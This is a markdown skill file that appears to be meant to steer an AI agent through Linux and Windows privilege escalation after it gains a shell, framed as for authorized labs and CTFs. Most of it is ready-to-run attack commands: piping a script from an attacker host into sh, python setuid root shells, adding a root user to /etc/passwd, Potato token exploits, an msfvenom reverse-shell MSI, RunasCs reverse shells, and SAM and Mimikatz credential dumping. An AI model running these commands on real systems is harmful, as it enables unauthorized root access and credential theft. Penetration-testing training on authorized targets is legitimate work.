---
name: tools-privesc
description: >
  One line: Linux + Windows local privilege-escalation tool arsenal for authorized labs.
  Trigger signals: "privesc", "got a shell", "escalate", "root", "SYSTEM", user flag captured
  but not root. Authorized lab practice only.
domain: privesc
type: arsenal
stability: locked
modes: [ctf, bugbounty]
schema_version: 1
---

# Local Privilege Escalation Arsenal

Loads once a foothold/shell exists and you need root/SYSTEM. Authorized lab practice only.
Enumerate the cheap wins first (`sudo -l`, SUID, caps / `whoami /priv`) before reaching for
kernel or token exploits.

## Linux

### Automated enumeration
- **linpeas.sh** — one-shot enum of every common vector; run early. `curl 10.10.14.5:8000/linpeas.sh | sh` (or transfer + `./linpeas.sh -a`). Grep the output: red/yellow highlights = likely wins. Look for `sudo`, `SUID`, `Capabilities`, `writable` paths, `PATH`, cron, cleartext creds. Gotcha: noisy — pipe to a file (`./linpeas.sh > lp.txt`) and read it, don't scroll the terminal.
- **pspy** — watches processes/cron without root; catches root-run cron jobs and their commands. `./pspy64 -pf -i 1000` (`-p` procs, `-f` file events, `-i` poll ms). Gotcha: leave it running a few minutes to catch periodic cron.
- **linux-exploit-suggester** (LES) — maps `uname -a` / kernel to public exploits. `./les.sh` on target, or `./les.sh -k 5.4.0`. Treat output as leads to verify, not guaranteed.
- **LinEnum** — older but reliable broad enum; complements linpeas. `./LinEnum.sh -t` (`-t` = thorough).

### Manual quick wins
- **sudo -l** — the first thing you run. Lists what you may run as another user. `sudo -l`. Any allowed binary → look it up on **GTFOBins** (gtfobins.github.io) for the sudo escape. `NOPASSWD` entries and env-preserving rules (`env_keep`, `LD_PRELOAD`) are gold.
- **SUID/SGID binaries** — run as file owner regardless of caller. `find / -perm -4000 -type f 2>/dev/null` (SUID; use `-2000` for SGID). Cross-reference each unusual binary against **GTFOBins** "SUID" section. Gotcha: ignore standard ones (`passwd`, `sudo`, `mount`); hunt the odd one out.
- **Capabilities** — fine-grained root powers on a binary. `getcap -r / 2>/dev/null`. `cap_setuid+ep` on e.g. python/perl → `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`. Also `cap_dac_read_search` (read any file), `cap_setgid`. Check GTFOBins "Capabilities".
- **Cron jobs & writable scripts** — root cron running a script you can write = root. `cat /etc/crontab`, `ls -la /etc/cron.*`, and pspy. If a cron'd script or any dir in its path is writable → inject a reverse shell / `chmod +s /bin/bash`.
- **Writable /etc/passwd** — if writable, add a root user. `openssl passwd -1 -salt x pass123` → append `hacker:$1$x$hash:0:0::/root:/bin/bash` then `su hacker`. Gotcha: also check `/etc/shadow` readable.
- **PATH hijack** — a root SUID/cron program calling a binary by bare name (no absolute path). Prepend a writable dir to `PATH` and drop a malicious binary with that name. `export PATH=/tmp:$PATH` after `echo '/bin/bash' > /tmp/<name>; chmod +x`.
- **NFS no_root_squash** — an export mounted with `no_root_squash` lets a remote root write root-owned SUID files. `showmount -e <target>`, mount it, place a SUID root shell as your own root, execute on target.
- **docker / lxd group** — membership = root-equivalent. Docker: `docker run -v /:/mnt -it alpine chroot /mnt sh`. lxd: import an alpine image, launch a privileged container mounting `/`.
- **Kernel exploits** — last resort. `uname -r` → `searchsploit linux kernel <ver>` (e.g. DirtyPipe, DirtyCow, PwnKit/pkexec). Gotcha: can panic/crash the box — only after `sudo -l`, SUID, and caps are exhausted; verify the exact kernel/distro match before running.

## Windows

### Automated enumeration
- **winPEAS** — Windows equivalent of linpeas. `winPEASx64.exe` (or `.bat` fallback). Highlights services, privileges, creds, AlwaysInstallElevated.
- **PrivescCheck.ps1** — lightweight, AMSI-friendly. `. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended`.
- **PowerUp** — service/registry misconfig hunter. `. .\PowerUp.ps1; Invoke-AllChecks`. Flags unquoted paths, weak service perms, AlwaysInstallElevated with ready-made abuse functions.
- **WES-NG** — offline patch-diff. On target `systeminfo > sys.txt`, then `wes.py sys.txt` locally maps missing KBs to exploits. Gotcha: run `wes.py --update` first.
- **Seatbelt** — targeted host survey (creds, tokens, sessions). `Seatbelt.exe -group=all`.

### Token / privilege abuse
- **whoami /priv** — run this first. Enabled `Se*Privilege`s are direct paths.
- **SeImpersonatePrivilege → Potato family** — impersonate SYSTEM token (common on service/IIS/MSSQL accounts). **PrintSpoofer** (`PrintSpoofer64.exe -i -c cmd`) or **GodPotato** (`GodPotato -cmd "cmd /c whoami"`) for Server 2019/2022 + Win10/11. **JuicyPotato** only for older ≤ Server 2016 / Win10 pre-1809. Gotcha: pick by OS build — JuicyPotato fails on modern builds; GodPotato/PrintSpoofer are the modern go-to.
- **SeBackupPrivilege / SeRestorePrivilege** — read/write any file. Back up the SAM & SYSTEM hives (`reg save hklm\sam sam.hive`, `reg save hklm\system system.hive`) then `secretsdump.py -sam sam.hive -system system.hive LOCAL` for hashes.
- **Unquoted service paths** — space in an unquoted `ImagePath` lets Windows run your planted exe. `wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"` → drop exe at the earlier path if the dir is writable, restart service.
- **Weak service permissions** — reconfigure a service you can edit. `accesschk.exe -uwcqv "user" *` or PowerUp; `sc config <svc> binPath= "C:\path\rev.exe"` then `sc start <svc>`.
- **AlwaysInstallElevated** — both registry keys = 1 lets any MSI run as SYSTEM. Check `reg query HKLM\...\Installer /v AlwaysInstallElevated` (and HKCU). `msfvenom -p windows/x64/shell_reverse_tcp ... -f msi -o r.msi` then `msiexec /quiet /i r.msi`.
- **Autoruns** — writable auto-start binary run by a privileged user. PowerUp / winPEAS flag these; replace the exe.
- **Stored credentials** — `cmdkey /list` (then `runas /savecred`), `reg query` for autologon/PuTTY creds, `unattend.xml` / `sysprep.inf` / `Groups.xml` (GPP), and SAM/SYSTEM via `reg save`. Search: `findstr /si password *.txt *.xml *.config`.
- **runas / RunasCs** — use recovered creds without an interactive session. `RunasCs.exe user pass "cmd" -r 10.10.14.5:4444` (`-r` = reverse-shell redirect).
- **Mimikatz** — once SYSTEM, dump creds/hashes for lateral movement. `privilege::debug` then `sekurlsa::logonpasswords`, or `lsadump::sam`. Gotcha: needs SYSTEM/debug; use it to harvest, not to escalate.

## Shell stabilization & file transfer
- **Upgrade a dumb TTY** — `python3 -c 'import pty; pty.spawn("/bin/bash")'`, then Ctrl-Z, `stty raw -echo; fg`, then `export TERM=xterm`. Now Ctrl-C, tab-complete, and editors work.
- **Transfers (Linux)** — attacker: `python3 -m http.server 8000`; target: `wget http://10.10.14.5:8000/linpeas.sh` or `curl -O ...`. Or `scp file user@target:/tmp` with creds. Quick pipe: `nc -lvnp 9001 < file` / `nc target 9001 > file`.
- **Transfers (Windows)** — `certutil -urlcache -f http://10.10.14.5:8000/winpeas.exe wp.exe`, PowerShell `iwr http://10.10.14.5:8000/x.exe -o x.exe` (or `(New-Object Net.WebClient).DownloadFile(...)`). SMB pull: attacker `impacket-smbserver share . -smb2support`, target `copy \\10.10.14.5\share\x.exe`.

## Discipline
- Always run `sudo -l` and check SUID + capabilities (Linux) / `whoami /priv` (Windows) before anything heavier.
- Kernel exploits are the **last resort** — they can crash/panic the box; exhaust config-based vectors first and match the exact kernel/build.
- On Windows, enabled privileges in `whoami /priv` usually beat hunting for CVEs — check them first.
- Cross-reference every sudo/SUID/capability finding against **GTFOBins**; every Windows service/registry finding against PowerUp output.
